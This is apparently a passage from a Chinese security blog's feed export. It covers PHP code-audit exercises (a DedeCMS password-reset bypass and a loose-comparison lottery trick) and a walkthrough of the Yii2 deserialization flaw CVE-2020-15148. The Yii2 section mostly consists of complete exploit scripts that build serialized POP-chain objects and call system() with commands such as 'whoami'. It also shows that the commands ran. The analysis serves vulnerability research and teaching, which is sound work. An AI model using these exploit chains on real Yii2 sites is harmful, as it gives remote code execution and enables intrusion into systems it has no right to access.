class="keyword">elseif</span>($dtime - $tptim &gt; $row[<span class="string">&#x27;mailtime&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">&#x27;UPDATE&#x27;</span>,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重新发送新的验证码确认邮件；</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ShowMsg(<span class="string">&#x27;对不起，请10分钟后再重新申请&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里代码逻辑是先根据<code>id</code>从<code>dede_pwd_tmp</code>数据表中判断是否有对应的密码记录,若账号为第一次修改密码,这里的<code>$row</code>就会空,进入<code>newmail()</code>函数,执行<code>insert()</code>操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#uploads\member\resetpassword.php 73行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newmail</span>(<span class="params">$mid, $userid, $mailto, $type, $send</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    $randval = random(<span class="number">8</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>($type == <span class="string">&#x27;INSERT&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = md5($randval);</span><br><span class="line">        $sql = <span class="string">&quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&#x27;<span class="subst">$mid</span>&#x27;, &#x27;<span class="subst">$userid</span>&#x27;,  &#x27;<span class="subst">$key</span>&#x27;, &#x27;<span class="subst">$mailtime</span>&#x27;);&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($db-&gt;ExecuteNoneQuery($sql))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($send == <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($send == <span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ShowMsg(<span class="string">&#x27;稍后跳转到修改页&#x27;</span>, $cfg_basehost.$cfg_memberurl.<span class="string">&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;</span>.$mid.<span class="string">&quot;&amp;amp;key=&quot;</span>.$randval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>先生成一个8位的随机密码并赋值给<code>$randval</code>,然后将其用md5加密,存储到<code>dede__pwd_tmp</code>表中,接着到了漏洞的触发点,进入<code>$send == 'N'</code>的操作,将未经md5加密的<code>$randval</code>传给了用户。</p>
<p>那么这里拼接的url就为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go</span><br></pre></td></tr></table></figure>
<p>继续跟进<code>dopost=getpasswd</code>的操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//修改密码</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&quot;对不起，请不要非法提交&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">    $row = $db-&gt;GetOne(<span class="string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($row))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&quot;对不起，请不要非法提交&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($setp))</span><br><span class="line">    &#123;</span><br><span class="line">        $tptim= (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">3</span>);</span><br><span class="line">        $dtime = time();</span><br><span class="line">        <span class="keyword">if</span>($dtime - $tptim &gt; $row[<span class="string">&#x27;mailtime&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            $db-&gt;executenonequery(<span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>);</span><br><span class="line">            ShowMsg(<span class="string">&quot;对不起，临时密码修改期限已过期&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword2.htm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>($setp == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($key)) $pwdtmp = $key;</span><br><span class="line"></span><br><span class="line">        $sn = md5(trim($pwdtmp));</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">&#x27;pwd&#x27;</span>] == $sn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($pwd != <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($pwd == $pwdok)</span><br><span class="line">                &#123;</span><br><span class="line">                    $pwdok = md5($pwdok);</span><br><span class="line">                    $sql = <span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">                    $db-&gt;executenonequery($sql);</span><br><span class="line">                    $sql = <span class="string">&quot;UPDATE `#@__member` SET `pwd` = &#x27;<span class="subst">$pwdok</span>&#x27; WHERE `mid` = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>($db-&gt;executenonequery($sql))</span><br><span class="line">                    &#123;</span><br><span class="line">                        showmsg(<span class="string">&#x27;更改密码成功，请牢记新密码&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            showmsg(<span class="string">&#x27;对不起，新密码为空或填写不一致&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        showmsg(<span class="string">&#x27;对不起，临时密码错误&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里先判断<code>id</code>是否执行过重置密码的操作如果没有则退出，接着进入了<code>empty($setp)</code>的操作，判断是否超过修改期限，最后包含了<code>resetpassword2.htm</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614175327.png" alt=""></p>
<p>页面设置了setp为2，进入<code>$setp == 2</code>的操作，这里判断了<code>$sn</code>与<code>dede_pwd_tmp</code>的<code>pwd</code>值(<code>$key</code>)是否相等,因为<br>
<code>$sn=md5($randval)=$row['pwd']</code>，这样就可以重置密码了。</p>
<h2 id="0x03-练习题">0x03 练习题</h2>
<p>题目链接: <a href="https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ">https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ</a> 密码: 59t2</p>
<p>这道题之前做过，问题出现在<code>api.php</code>中的<code>buy</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params">$req</span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	$money = $_SESSION[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	$numbers = $req[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	$win_numbers = random_win_nums();</span><br><span class="line">	$same_count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键点在第10行代码，它使用<code>==</code>进行比较，而语言定义，除了 <strong>0、false、null</strong> 以外均为 <strong>true</strong> ，所以使用 <strong>true</strong> 和数字进行比较，返回的值肯定是 <strong>true</strong>，所以我们抓包修改数据提交7个<strong>true</strong>，如下图：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614212409.png" alt=""></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Yii2反序列化漏洞分析及拓展</title>
    <url>/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<h1 id="CVE-2020-15148-Yii2-反序列化分析及拓展">CVE-2020-15148 Yii2 反序列化分析及拓展</h1>
<h2 id="漏洞范围">漏洞范围</h2>
<ul>
<li>Yii2 &lt; 2.0.38</li>
</ul>
<h2 id="环境安装">环境安装</h2>
<p>这里直接选择去GitHub官方仓库拉取Yii2的源代码：</p>
<p><a href="https://github.com/yiisoft/yii2/releases">https://github.com/yiisoft/yii2/releases</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210340.png" alt=""></p>
<p>下载到本地后解压到web目录，修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210528.png" alt=""></p>
<p>再在Controller添加一个反序列化的入口代码：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210912.png" style="zoom:50%;" />
<p>MacOS下用MAMP搭建PHP调试环境，测试一下：</p>
<blockquote>
<p>搭建教程：<a href="https://www.sqlsec.com/2020/07/macphp.html">https://www.sqlsec.com/2020/07/macphp.html</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006211613.png" alt=""></p>
<p>验证成功，开始审计。</p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>根据现有的资料，反序列化的起点是在<code>yii\db\BatchQueryResult</code>类中，文件位置<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007211913.png" alt=""></p>
<p><code>__destruct()</code>函数调用了<code>reset()</code>方法，<code>reset()</code>方法中的<code>_dataReader</code>参数是可控的，并且调用了该参数的<code>close()</code>函数，那么此处就可以作为跳板，去执行其他类中的<code>__call()</code>函数，全局查找关键字<code>function __call</code>：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224238.png" style="zoom:50%;" />
<p>一共有找到16个<code>__call()</code>函数，那就一个一个的分析下来，其中Codeception组件中多数是直接抛出异常，没有可利用的地方，但是<code>Faker\Generator</code>类是可以成为POP链的。具体代码位于：<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p>
<p>首先<code>__call()</code>函数中调用了<code>format()</code>方法：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224606.png" style="zoom:50%;" />
<p>接着跟下去<code>format()</code>方法，参数<code>$method</code>和<code>$attributes</code>都是不可控的：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224816.png" alt=""></p>
<p>在<code>format()</code>方法内部，使用回调函数<code>call_user_func_array()</code>调用了<code>getFormatter()</code>方法。在该方法中，我们只关心第一个if语句，</p>
<p>由于<code>$this-&gt;formatter</code>是我们可控的，所以这里就可以调用任意类中的任意方法了。但是上面提到过，此时<code>$formatter='close'</code>而<code>$arguments</code>为空，也就是说<code>call_user_func_array()</code>这个函数的第一个参数可控，第二个参数为空。说的更透彻一点，要寻找的就是可以实现RCE的任意一个方法，并且参数是类的成员变量！</p>
<p>同样的，这里我们用<code>call_user_func()</code>去实现RCE，用正则表达式<code>call_user_func(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)\)</code>去匹配参数的限制，全局搜索：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231112.png" style="zoom:50%;" />
<p><code>yii\rest\CreateAction::run()</code>和<code>yii\rest\IndexAction::run()</code>都可以实现上述条件下的RCE：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231243.png" alt=""></p>
<p>那么整个POP链也就清楚了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\CreateAction::run()</span><br></pre></td></tr></table></figure>
<h2 id="编写EXP">编写EXP</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007233404.png" alt=""></p>
<h2 id="继续挖掘">继续挖掘</h2>
<p>新版本的<code>BatchQueryResult</code>类已经无法反序列化了，那就全局搜索<code>__destruct()</code>函数，然后一个个的排查。</p>
<h3 id="第一条POP链">第一条POP链</h3>
<p>触发点位于<code>vendor\codeception\codeception\ext\RunProcess.php</code>，POP链如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Codeception\Extension\RunProcess::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>EXP：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $process;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;process = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第二条POP链">第二条POP链</h3>
<p>触发点位于<code>vendor\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>，POP链如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\Deprecated.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>EXP：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Deprecated</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">Deprecated</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">private</span> $keys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> Deprecated();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(<span class="string">&quot;just&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;for&quot;</span>=&gt;<span class="string">&quot;ca01h&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然报错，但命令还是成功执行了。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008174414.png" alt=""></p>
<p>与此类似的POP链还有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\See.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>以及</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Description.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<h3 id="第三条POP链">第三条POP链</h3>
<blockquote>
<p>PHP &gt; 7.1</p>
</blockquote>
<p>再来一个从<code>__wakeup</code>入手的POP链，反序列化起点位于<code>vendor\symfony\string\UnicodeString.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213827.png" alt=""></p>
<p>继续跟<code>normalizer_is_normalized()</code>函数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213922.png" alt=""></p>
<p>跟进静态方法<code>isNormalized()</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214024.png" alt=""></p>
<p>看到<code>preg_match($s)</code>，那么``normalizer_is_normalized()<code>就可以作为跳板触发</code>__toString()`方法，接下来又可以和上面提到的POP链连在一起了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Symfony\Component\String\UnicodeString::__wakeup()</span><br><span class="line">-&gt;</span><br><span class="line">phpDocumentor\Reflection\DocBlock\Tags\See::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>EXP：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;touch test.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span 